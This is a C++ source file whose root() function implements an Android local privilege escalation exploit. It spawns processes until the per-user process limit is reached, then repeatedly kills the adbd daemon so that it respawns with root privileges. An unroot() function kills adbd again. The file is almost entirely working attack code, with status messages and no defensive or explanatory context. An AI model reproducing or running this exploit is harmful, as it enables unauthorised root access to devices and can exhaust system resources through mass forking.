/*
 * impl.cpp
 *
 *  Created on: 20.01.2011
 *      Author: mars
 */

#include "impl.h"

#include "proc.h"

#include <stdio.h>

#include <sys/resource.h>

////////////////////////////////////////////////////////////////////////////////////////
const char* g_adbd_name( "adbd" );

////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////
int root()
{
   int ret( 0 );

   printf( "Rooting device ...\n" );

   rlimit s_rlimit = { 0 };

   getrlimit( RLIMIT_NPROC, &s_rlimit );

   printf( "RLIMIT_NPROC: %d.%d\n", s_rlimit.rlim_cur, s_rlimit.rlim_max );

   pid_t adbdPid( get_pid( g_adbd_name ) );

   if( adbdPid >= 0 )
   {
      printf( "adbd pid: %d\n", adbdPid );
   }
   else
   {
      printf( "[ERROR] adbd not found\n" );
   }

   printf( "spawning children ...\n" );

   //////////////////////////////////////////////////////
   pid_t pid( -1 );

   for( int i( 0 ); ; ++i )
   {
      pid = fork();

      if( pid == 0 )
      {
         return ret;
      }
      else if( pid < 0 )
      {
         printf( "limit reached. kill adbd and wait for its root ...\n" );

         adbdPid = get_pid( g_adbd_name );

         if( adbdPid >=0 )
         {
            if( get_pid_user( adbdPid ) != 0 )
            {
               kill( adbdPid, SIGKILL );
            }
            else
            {
               break;
            }
         }
         else
         {
            static int theRespounGuard( 10 );

            if( --theRespounGuard )
            {
               sleep( 1 );
            }
            else
            {
               break;
            }
         }
      }
   }

   return ret;
}

////////////////////////////////////////////////////////////////////////////////////
int unroot()
{
   int ret( 0 );

   printf( "Unrooting device ...\n" );

   pid_t adbdPid( get_pid( g_adbd_name ) );

   if( adbdPid >= 0 )
   {
      printf( "adbd pid: %d\n", adbdPid );

      ///////////////////////////////////////////////////////////////////////////
      kill( adbdPid, SIGKILL );
   }
   else
   {
      printf( "[ERROR] adbd not found\n" );
   }

   return ret;
}
